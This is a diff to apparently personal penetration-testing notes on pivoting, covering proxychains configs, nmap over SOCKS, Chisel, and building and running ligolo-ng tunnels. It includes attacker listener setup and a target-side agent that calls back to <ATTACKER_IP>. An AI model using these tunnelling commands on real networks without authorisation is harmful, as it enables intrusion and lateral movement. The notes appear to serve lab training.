@@ -163,6 +163,9 @@ netsh.exe interface portproxy show v4tov4
 
 ## SOCKS
 
+- Remember that only proper TCP traffic works with SOCKS (e.g. **NOT** certain scans like `nmap -sS` sends malformed packets or ICMP ping), use `nmap -sT --proxy`
+- `sudo proxychains` is required for some (or most/all) proxied tools like `netexec`
+
 | **Feature**             | **SOCKS4**                        | **SOCKS5**                            |
 | ----------------------- | --------------------------------- | ------------------------------------- |
 | **Transport Protocols** | TCP only                          | **TCP & UDP**                         |
@@ -173,12 +176,10 @@ netsh.exe interface portproxy show v4tov4
 | **SSH (`-D`) Default**  | Supported (manual flag)           | **Default**                           |
 | **Chisel Default**      | Not standard                      | **Native / Built-in**                 |
 
-- Remember that only proper TCP traffic works with SOCKS (e.g. **NOT** certain scans like `nmap -sS` sends malformed packets or ICMP ping), use `nmap -sT --proxy`
-
 ```bash
-proxychains -q -f <CONFIG_FILE> <COMMAND>
+sudo proxychains -q -f <CONFIG_FILE> <COMMAND>
 
-proxychains msfconsole
+sudo proxychains msfconsole
 
 # USE nmap's builtin --proxy option
 nmap -sT -Pn -n --proxy socks4://127.0.0.1:9050 <TARGET>
@@ -196,15 +197,23 @@ cat /etc/proxychains4.conf | grep -v '^#' | grep -v '^\s*$'
 
 ---
 
-sudo mv -v /etc/proxychains4.conf /etc/proxychains4.conf.BAK
-
-echo "#quiet_mode
-proxy_dns
-#dynamic_chain
+# Chisel config
+sudo tee /etc/proxychains_chisel.conf << 'EOF'
 strict_chain
+proxy_dns
 [ProxyList]
-socks5  127.0.0.1 1080  # Chisel
-socks4  127.0.0.1 9050  # SSH -D proxy or nmap" | sudo tee /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+EOF
+sudo ln -sf /etc/proxychains_chisel.conf /etc/proxychains.conf
+
+# SSH / nmap config
+sudo tee /etc/proxychains_ssh.conf << 'EOF'
+strict_chain
+proxy_dns
+[ProxyList]
+socks4 127.0.0.1 9050
+EOF
+sudo ln -sf /etc/proxychains_ssh.conf /etc/proxychains.conf
 ```
 
 #### Metasploit
@@ -277,10 +286,13 @@ sudo sshuttle -r <USER>@<TARGET> --ssh-cmd "ssh -o StrictHostKeyChecking=no -o U
 
 ## Chisel
 
-"Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH"
 - https://github.com/jpillora/chisel
 
-**NOTE:** configure [[lateral-movement#Step 0 Pre-Requisites]] and **SOCKS5 w/ port 1080**
+"Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH"
+
+**NOTE:** configure [SOCKS5 proxy w/ port 1080](#step-0-pre-requisites)
+
+**NOTE:** in [lab environments, might require fixing Go]({{% ref "troubleshooting.md#fix-go" %}})
 
 ```bash
 ### LINUX
@@ -326,10 +338,12 @@ upx --lzma chisel*
 
 Sets up a new interface and route to move traffic
 
-**Build:**
+**NOTE:** in [lab environments, might require fixing Go]({{% ref "troubleshooting.md#fix-go" %}})
+
+### Build
+
 ```bash
 git clone https://github.com/nicocha30/ligolo-ng.git && cd ligolo-ng
-
 go build -o agent cmd/agent/main.go
 go build -o proxy cmd/proxy/main.go
 # Build for Windows
@@ -342,19 +356,22 @@ GOOS=linux go build -o proxy cmd/proxy/main.go
 upx --lzma agent* proxy*
 ```
 
-**ATTACKER: Listener**
+
+### ATTACKER: Listener
 ```bash
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
-# listens on :11601 by default
-./proxy -selfcert
+sudo ip addr add <MY_IP_ON_SUBNET>/24 dev ligolo  # .252
+sudo ./proxy -selfcert  # listens on :11601 by default
 ```
 
-**Target Listen/Bind**
-(Forward) ATTACKER connects to TARGET
+### Target 
+
+#### (Forward) ATTACKER connects to TARGET
+
 ```bash
 # TARGET
-./agent.exe -bind 0.0.0.0:<PORT>
+.\agent.exe -bind 0.0.0.0:<PORT>
 
 # ATTACKER: ligolo session
 connect_agent --ip <TARGET>:<PORT>
@@ -362,18 +379,13 @@ session
 tunnel_start --tun ligolo
 ```
 
-**Target Connect/Reverse**
-(Reverse) TARGET connects to ATTACKER
+#### (Reverse) TARGET calls back to ATTACKER
+
 ```bash
 # Target
-./agent.exe -connect <ATTACKER_IP>:<PORT> -ignore-cert
+.\agent.exe -connect <ATTACKER_IP>:<PORT> -ignore-cert
 
 # ATTACKER: ligolo session
 session
 tunnel_start --tun ligolo
-```
-
-**ATTACKER: Create Route**
-```bash
-sudo ip route add <SUBNET_TARGET> dev ligolo
 ```
